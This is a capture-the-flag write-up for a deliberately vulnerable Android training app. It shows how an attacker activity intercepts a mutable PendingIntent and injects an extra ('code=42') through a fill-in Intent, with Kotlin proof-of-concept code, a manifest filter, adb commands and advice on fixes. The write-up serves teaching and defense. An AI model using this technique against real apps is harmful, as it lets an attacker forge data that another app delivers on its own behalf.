# Flag 23 — Injecting Data via a Mutable PendingIntent

**Vulnerability category:** PendingIntent misuse
**Target component:** `io.hextree.attacksurface.activities.Flag23Activity`

---

## Target

This flag flips the direction of [flag 22](../flag-22): instead of the attacker creating the `PendingIntent`, `Flag23Activity` creates one of its own — with `FLAG_MUTABLE` — and hands it to another component (via the custom action `io.hextree.attacksurface.MUTATE_ME`, carried as an extra named `"pending_intent"`), presumably expecting it to simply be fired later as a notification/callback.

> Note: this write-up is based on observed behavior and the PoC code, since the target activity wasn't decompiled for this flag — only its reaction to the fill-in `Intent` was inspected.

## Vulnerability

A `PendingIntent` created with `FLAG_MUTABLE` allows whoever ends up calling `.send()` on it to supply a **fill-in `Intent`**, whose extras get merged into (and can override) the original `Intent` the `PendingIntent` wraps, before it's actually delivered to its real destination. This is meant for legitimate use cases (e.g. a notification action that needs some per-send customization), but it means that **whoever receives the `PendingIntent` gets partial control over the data that will eventually reach the `PendingIntent`'s original target** — not just the ability to trigger it.

Here, `Flag23Activity` hands out a mutable `PendingIntent` to an untrusted recipient. The recipient (our app) doesn't need to know or care what the `PendingIntent` ultimately points to — it just needs to call `.send()` with a crafted fill-in `Intent`, injecting whatever extra the real destination's logic checks for.

## Approach

Our `CatcherActivity`, registered for both `io.hextree.attacksurface.ATTACK_ME` and `io.hextree.attacksurface.MUTATE_ME` (so it can be resolved for either flag's implicit intent), handles the mutable-`PendingIntent` case:

```kotlin
val pi = intent.getParcelableExtra<PendingIntent>("pending_intent")
if (pi != null) {
    val fillIn = Intent().apply { putExtra("code", 42) }
    pi.send(this, 0, fillIn)
    Log.i(TAG, "Injected code=42 and relayed the mutable PendingIntent")
    return
}
```

Steps:

1. Register `CatcherActivity` with an `<intent-filter>` matching `io.hextree.attacksurface.MUTATE_ME`:

```xml
<activity android:name=".CatcherActivity" android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
        <action android:name="io.hextree.attacksurface.MUTATE_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

2. Launch `Flag23Activity` directly so it creates and dispatches its mutable `PendingIntent` (via implicit resolution, just like flags 10–12):

```bash
./gradlew installDebug
adb shell am force-stop io.hextree.attacksurface
adb shell am start -n io.hextree.attacksurface/.activities.Flag23Activity
```

3. When our `CatcherActivity` receives the `pending_intent` extra, it builds a fill-in `Intent` carrying `code = 42` and calls `pi.send(this, 0, fillIn)`. Because the `PendingIntent` is mutable, this extra is merged into the base `Intent` before it's delivered to wherever `Flag23Activity` actually intended it to go — satisfying whatever internal check expects `code == 42` and releasing the flag.

See [`exploit/CatcherActivity.kt`](./exploit/CatcherActivity.kt) for the full handler (shared with flag 22's catcher, dispatching on whether a `pending_intent` extra is present).

## Why it works

Handing out a mutable `PendingIntent` to an untrusted component is equivalent to giving that component a limited, but real, ability to shape a future `Intent` that will be delivered on the issuing app's behalf. `Flag23Activity` trusts that whoever it hands the `PendingIntent` to will only use it as a simple trigger, but mutability means the recipient can also smuggle in extras that the final destination's logic may treat as legitimate, internally-sourced data.

## Fix

- Default to `FLAG_IMMUTABLE` for any `PendingIntent` handed to a component outside your own trust boundary (this has been the Android-recommended default since API 23, and is required on API 31+ unless explicitly opted out). Only use `FLAG_MUTABLE` when the fill-in mechanism is genuinely needed and the recipient is trusted.
- If a mutable `PendingIntent` must be shared with an external component, treat any data that later arrives through it — including the "own" extras — as untrusted, exactly as if it came from an external caller directly.
- Don't rely on a single scalar extra (`code == 42`) as an internal authorization signal if it can be injected this way — validate meaningful state server-side or through a channel the recipient of the `PendingIntent` cannot influence.
